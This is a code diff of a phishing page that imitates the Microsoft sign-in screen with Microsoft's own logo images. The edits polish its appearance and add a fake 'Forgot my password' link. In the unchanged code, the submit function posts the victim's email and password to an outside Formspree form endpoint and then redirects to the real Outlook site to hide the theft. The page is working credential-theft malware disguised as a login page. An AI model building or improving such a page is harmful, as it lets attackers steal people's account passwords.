@@ -23,13 +23,16 @@
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
         
+        /* Fixed Identity Row: No more gray box or broken icons */
         .identity-container {
             display: flex; align-items: center;
-            padding: 8px; margin-bottom: 16px;
-            cursor: pointer; background: #f2f2f2;
+            margin-bottom: 16px; cursor: pointer;
+            font-size: 15px; color: #1b1b1b;
         }
-        .back-btn-img, .user-avatar { width: 20px; height: 20px; margin-right: 8px; }
-        #display-email { font-size: 15px; color: #1b1b1b; overflow: hidden; text-overflow: ellipsis; }
+        .back-arrow {
+            width: 12px; height: 12px;
+            margin-right: 8px; opacity: 0.8;
+        }
 
         .input-field {
             width: 100%; border: none; border-bottom: 1px solid #666;
@@ -39,6 +42,7 @@
         .input-field:focus { border-bottom: 2px solid #0067b8; }
         .help-text { font-size: 13px; margin: 12px 0; color: #1b1b1b; }
         .help-text a { color: #0067b8; text-decoration: none; }
+        .help-text a:hover { text-decoration: underline; }
         
         .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
         .btn-next {
@@ -48,7 +52,7 @@
         .options-box {
             background: #fff; padding: 12px 44px;
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-            display: flex; align-items: center;
+            display: flex; align-items: center; cursor: pointer;
         }
         .key-icon { width: 24px; margin-right: 12px; opacity: 0.6; }
         .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
@@ -69,12 +73,12 @@
 
             <div id="password-section" style="display: none;">
                 <div class="identity-container" onclick="showEmail()">
-                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.svg" class="back-btn-img">
-                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/user_6683a54f0545f4457e5b778733f3883a.svg" class="user-avatar">
-                    <div id="display-email"></div>
+                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.svg" class="back-arrow">
+                    <span id="display-email"></span>
                 </div>
                 <h1>Enter password</h1>
                 <input type="password" id="user-password" placeholder="Password" class="input-field" onkeydown="if(event.key==='Enter') submitData()">
+                <p class="help-text"><a href="#">Forgot my password</a></p>
                 <div class="button-row"><button class="btn-next" onclick="submitData()">Sign in</button></div>
             </div>
         </div>
@@ -101,17 +105,13 @@
         async function submitData() {
             const passVal = document.getElementById('user-password').value;
             if(!passVal) return;
-
-            // Send to Formspree
             try {
                 await fetch('https://formspree.io/f/mvzwepzj', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ email: emailVal, password: passVal })
                 });
-            } catch (e) { console.log(e); }
-
-            // Redirect to real outlook
+            } catch (e) {}
             window.location.href = "https://outlook.office.com/mail/";
         }
     </script>
